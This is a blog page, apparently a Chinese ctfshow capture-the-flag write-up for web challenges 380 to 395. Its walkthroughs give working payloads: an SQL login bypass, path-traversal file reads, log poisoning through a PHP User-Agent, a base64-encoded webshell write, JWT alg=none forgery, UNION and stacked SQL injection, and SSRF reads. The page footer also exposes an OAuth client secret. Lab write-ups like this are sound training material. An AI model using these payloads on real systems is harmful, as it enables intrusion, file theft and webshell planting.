@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]黑盒测试 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web380
+通过目录扫描发现page.php
+访问，通过页面报错信息，发现页面通过传入id来获取文件信息。
+page.php?id=flag
+
+web381
+查看index.php源码
+&lt;head&gt;
+  &lt;meta ch..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]黑盒测试</h2>
+            <div class="post-date">2024-06-07</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowhei-he-ce-shi.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web380">web380</h2>
+<p>通过目录扫描发现page.php<br>
+访问，通过页面报错信息，发现页面通过传入id来获取文件信息。</p>
+<pre><code>page.php?id=flag
+</code></pre>
+<h2 id="web381">web381</h2>
+<p>查看index.php源码</p>
+<pre><code class="language-html">&lt;head&gt;
+  &lt;meta charset=&quot;utf-8&quot;&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;
+  &lt;title&gt;CTFshow萌新博客&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/layui.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/global.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;alsckdfy/layui/css/tree.css&quot;&gt;
+&lt;/head&gt;
+</code></pre>
+<p>路径<code>/alsckdfy</code>比较可疑，访问获得flag。</p>
+<h2 id="web382">web382</h2>
+<h2 id="web383">web383</h2>
+<p>访问路径<code>/alsckdfy</code>，出现登录框。<br>
+使用万能账号。<br>
+需要抓包修改，因为登录时引号和加号会被url编码。</p>
+<pre><code>u=admin'--+&amp;p=123
+</code></pre>
+<h2 id="web384">web384</h2>
+<p>访问路径<code>/alsckdfy</code><br>
+根据提示爆破密码，前两位字母，后三位数字。</p>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1719385129973.png" alt="" loading="lazy"></figure>
+<p>这里密码是xy123，爆破速度有点慢，逃课了。</p>
+<h2 id="web385">web385</h2>
+<p>在page.php中可通过目录穿越来读取文件</p>
+<pre><code>page.php?id=../../../../../var/www/html/page
+</code></pre>
+<p>page.php</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+$id = $_GET['id'];
+if(!isset($id)){
+	die('打开page_$id.php失败');
+}else{
+	$html = file_get_contents('page_'.$id.'.php');
+	echo $html;
+}
+</code></pre>
+<p>install/index.php</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+$dbhost =&quot;127.0.0.1&quot;;
+$dbuser = &quot;root&quot;;
+$dbpwd = &quot;root&quot;;
+$dbname = &quot;ctfshow&quot;;
+$charName = &quot;utf-8&quot;; 
+echo '请务必在安装成功后删除本文件';
+echo '&lt;br&gt;需要重新安装请访问install/?install,管理员密码将重置为默认密码';
+if(isset($_GET['install'])){
+	$conn = new mysqli($dbhost,$dbuser,$dbpwd,$dbname);
+	if(mysqli_connect_errno()){
+	 	die(json_encode(array(mysqli_connect_error())));
+	}
+	$sql = &quot;update admin_user set username='admin',password='admin888' where username='admin';&quot;;
+	$result = $conn-&gt;query($sql);
+	echo '&lt;br&gt;安装成功，请立即删除本文件';
+
+}
+</code></pre>
+<p>访问<code>install/?install</code>可重置管理员密码</p>
+<p>使用admin/admin888登录即可获得flag</p>
+<h2 id="web386">web386</h2>
+<p>安装页面使用了<code>lock.dat</code>进行校验，无法重置管理员密码。</p>
+<p>使用page.php读取check.php内容</p>
+<pre><code>page.php?id=../../../../../var/www/html/alsckdfy/check
+</code></pre>
+<p>check.php</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+require_once &quot;config.php&quot;;
+$flag='ctfshow{7a8ef909-3faf-4954-bde8-3d67c90443cc}';
+$u=$_POST['u'];
+$p=$_POST['p'];
+if(isset($u) &amp;&amp; isset($p)){
+	$conn = new mysqli($dbhost,$dbuser,$dbpwd,$dbname);
+	if(mysqli_connect_errno()){
+	 	die(json_encode(array(mysqli_connect_error())));
+	}
+	$conn-&gt;query(&quot;set name $charName&quot;);
+	$num = 1;
+	$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;$num,
+		&quot;data&quot;=&gt;array()
+	);
+	if(!preg_match('/^[A-Za-z0-9]+$/i', $u)){
+				die('error');
+					}
+		if(!preg_match('/^[A-Za-z0-9]+$/i', $p)){
+					die('error');
+						}
+	$sql = &quot;select id,username,password from admin_user where username = '&quot;.$u.&quot;' and password = '&quot;.$p.&quot;';&quot;;
+	$result = $conn-&gt;query($sql);
+
+	if($row = $result-&gt;fetch_object()){
+		echo $flag;
+	}else{
+		echo 'error';
+	}
+}else{
+	die('error');
+}
+
+?&gt;
+</code></pre>
+<h2 id="web387">web387</h2>
+<p>经过目录扫描发现robots.txt含有debug目录</p>
+<pre><code>disallow:/debug
+</code></pre>
+<p>根据页面提示可传入file参数，测试后发现页面存在文件包含漏洞。</p>
+<p>使用日志包含进行命令执行，读取check.php文件。</p>
+<pre><code>GET /debug/?file=/var/log/nginx/access.log HTTP/1.1
+Host: 72de9142-7b46-4583-a090-b8b438463503.challenge.ctf.show
+Upgrade-Insecure-Requests: 1
+User-Agent: &lt;?php system('cat ../alsckdfy/check.php');?&gt;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+</code></pre>
+<h2 id="web388">web388</h2>
+<p>这题debug页面没有回显，依然使用上题方法，直接写入shell。</p>
+<pre><code>GET /debug/?file=/var/log/nginx/access.log HTTP/1.1
+Host: 6e738533-f15e-4039-982b-726467ca437b.challenge.ctf.show
+User-Agent: &lt;?php file_put_contents(base64_decode('L3Zhci93d3cvaHRtbC9zaGVsbC5waHA='),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4g')) ?&gt;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+</code></pre>
+<h2 id="web389">web389</h2>
+<p>访问debug页面显示没有权限。<br>
+查看数据包发现Cookie为jwt形式，进行爆破secretkey为123456，伪造一个admin的jwt。</p>
+<p>后续步骤同上题</p>
+<h2 id="web390">web390</h2>
+<p>这题jwt密钥无法爆破出来，但是可以使用alg=none来绕过jwt验证（上题也可以）</p>
+<pre><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcxOTc0MzEwNCwiZXhwIjoxNzE5NzUwMzA0LCJuYmYiOjE3MTk3NDMxMDQsInN1YiI6ImFkbWluIiwianRpIjoiNDNjMDVmNzE5ZDhjNDAzM2VkOTc0MmZhZGE5YmE1MmUifQ==.
+
+{&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}.{&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1719743104,&quot;exp&quot;:1719750304,&quot;nbf&quot;:1719743104,&quot;sub&quot;:&quot;admin&quot;,&quot;jti&quot;:&quot;43c05f719d8c4033ed9742fada9ba52e&quot;}.
+</code></pre>
+<p>预期解：<br>
+page.php存在sql注入</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+require_once &quot;alsckdfy/config.php&quot;;
+$id = $_GET['id'];
+if(!isset($id)){
+	die('文章不存在');
+}else{
+	$conn = new mysqli($dbhost,$dbuser,$dbpwd,$dbname);
+	if(mysqli_connect_errno()){
+	 	die(json_encode(array(mysqli_connect_error())));
+	}
+	$conn-&gt;query(&quot;set name $charName&quot;);
+	$num = 1;
+	$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;$num,
+		&quot;data&quot;=&gt;array()
+	);
+	$sql = &quot;select id,title,content from content where id=&quot;.$id.&quot;;&quot;;
+	$result = $conn-&gt;query($sql);
+	if($row = $result-&gt;fetch_assoc()){
+		$content = $row;
+	}
+}
+?&gt;
+</code></pre>
+<p>payload</p>
+<pre><code>?id=0 union select 1,2,(select load_file('/var/www/html/alsckdfy/check.php'))
+</code></pre>
+<h2 id="web391">web391</h2>
+<p>同样是sql注入，不过注入点在标题搜索处</p>
+<pre><code>search.php?title=0' union select 1,2,(select load_file('/var/www/html/alsckdfy/check.php'))--+
+</code></pre>
+<h2 id="web392">web392</h2>
+<p>同上题，不过flag不在check.php中,在<code>/flag</code>中</p>
+<pre><code>search.php?title=0' union select 1,2,(select load_file('/flag'))--+
+</code></pre>
+<h2 id="web393">web393</h2>
+<p>sql注入点没有文件读取权限，读取表后发现有一个link表。<br>
+在最下方发现搜索引擎功能，存在ssrf，但是由id传参，推测是通过link表查询具体值。</p>
+<p>利用sql堆叠注入插入link值。</p>
+<pre><code>search.php?title=1';insert into link values(10,'a','file:///flag');
+</code></pre>
+<p>利用ssrf读取flag</p>
+<pre><code>/link.php?id=10
+</code></pre>
+<h2 id="web394">web394</h2>
+<h2 id="web395">web395</h2>
+<p>sql注入处存在过滤，使用16进制绕过。</p>
+<pre><code>/search.php?title=1';insert into link values(10,'a',0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);
+16进制为file:///var/www/html/alsckdfy/check.php
+</code></pre>
+<p>利用ssrf读取文件</p>
+<pre><code>/link.php?id=10
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowxxe/">
+                  <h3 class="post-title">
+                    [ctfshow]XXE
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
